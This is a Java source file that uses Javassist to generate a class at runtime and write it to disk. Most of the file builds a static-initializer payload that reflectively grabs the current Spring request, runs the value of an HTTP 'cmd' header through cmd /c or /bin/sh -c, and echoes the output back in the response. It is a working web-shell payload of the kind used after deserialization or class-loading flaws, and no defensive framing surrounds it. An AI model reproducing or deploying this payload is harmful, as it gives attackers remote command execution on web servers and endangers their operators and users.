package com.idiot9.tmp;

import javassist.*;

import java.io.IOException;
import java.lang.reflect.Constructor;
import java.lang.reflect.Method;

public class JavassistTest {
    public static void main(String[] args) throws CannotCompileException, NotFoundException, IOException {
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass = pool.makeClass("JavassistTest");

//        CtConstructor staticBlock = CtNewConstructor.make("static {}", ctClass);
//        ctClass.addConstructor(staticBlock);
        try {
            java.lang.reflect.Method method = JavassistTest.getMethod("JavassistTest", "hello", new Class[]{String.class});
            method.invoke(null, new Object[]{"hello"});
        } catch (java.lang.Exception e) {
        }

        String getMethod = "    private static java.lang.reflect.Method getMethod(java.lang.String className, java.lang.String methodName, java.lang.Class[] classes) throws java.lang.Exception {\n" +
                "        java.lang.Class clazz = Class.forName(className);\n" +
                "        java.lang.reflect.Method method = clazz.getDeclaredMethod(methodName, classes);\n" +
                "        method.setAccessible(true);\n" +
                "        return method;\n" +
                "    }";

//        ctClass.addMethod(CtNewMethod.make(getMethod, ctClass));

        String hello = "public static void hello(String name){\n" +
                "        System.out.println(\"hello\");\n" +
                "    }";

//        ctClass.addMethod(CtNewMethod.make(hello, ctClass));

        String static_block = "try {\n" +
                "            java.lang.Class c = java.lang.Thread.currentThread().getContextClassLoader().loadClass(\"org.springframework.web.context.request.RequestContextHolder\");\n" +
                "            java.lang.reflect.Method m = c.getMethod(\"getRequestAttributes\", null);\n" +
                "            java.lang.Object o = m.invoke(null, null);\n" +
                "            c = java.lang.Thread.currentThread().getContextClassLoader().loadClass(\"org.springframework.web.context.request.ServletRequestAttributes\");\n" +
                "            m = c.getMethod(\"getResponse\", null);\n" +
                "            java.lang.reflect.Method m1 = c.getMethod(\"getRequest\", new Class[0]);\n" +
                "            java.lang.Object resp = m.invoke(o, null);\n" +
                "            java.lang.Object req = m1.invoke(o, null);\n" +
                "            java.lang.reflect.Method getWriter = java.lang.Thread.currentThread().getContextClassLoader().loadClass(\"javax.servlet.ServletResponse\").getDeclaredMethod(\"getWriter\", null);\n" +
                "            java.lang.reflect.Method getHeader = java.lang.Thread.currentThread().getContextClassLoader().loadClass(\"javax.servlet.http.HttpServletRequest\").getDeclaredMethod(\"getHeader\", new Class[]{java.lang.String.class});\n" +
                "            getHeader.setAccessible(true);\n" +
                "            getWriter.setAccessible(true);\n" +
                "            java.lang.Object writer = getWriter.invoke(resp, null);\n" +
                "            java.lang.String cmd = (String)getHeader.invoke(req, new Object[]{\"cmd\"});\n" +
                "            java.lang.String[] commands = new String[3];\n" +
                "            if (java.lang.System.getProperty(\"os.name\").toUpperCase().contains(\"WIN\")) {\n" +
                "                commands[0] = \"cmd\";\n" +
                "                commands[1] = \"/c\";\n" +
                "            } else {\n" +
                "                commands[0] = \"/bin/sh\";\n" +
                "                commands[1] = \"-c\";\n" +
                "            }\n" +
                "\n" +
                "            commands[2] = cmd;\n" +
                "            writer.getClass().getDeclaredMethod(\"println\", new Class[]{java.lang.String.class}).invoke(writer, new Object[]{(new java.util.Scanner(java.lang.Runtime.getRuntime().exec(commands).getInputStream())).useDelimiter(\"\\\\A\").next()});\n" +
                "            writer.getClass().getDeclaredMethod(\"flush\", null).invoke(writer, new Object[]{});\n" +
                "            writer.getClass().getDeclaredMethod(\"close\", null).invoke(writer, new Object[]{});\n" +
                "        } catch (java.lang.Exception e) {\n" +
                "        }";

        ctClass.makeClassInitializer().insertAfter(static_block);

        ctClass.writeFile();
    }

    public static void hello(String name){
        System.out.println("hello");
    }

    private static java.lang.reflect.Method getMethod(java.lang.String className, java.lang.String methodName, java.lang.Class[] classes) throws java.lang.Exception {
        java.lang.Class clazz = Class.forName(className);
        java.lang.reflect.Method method = clazz.getDeclaredMethod(methodName, classes);
        method.setAccessible(true);
        return method;
    }
}
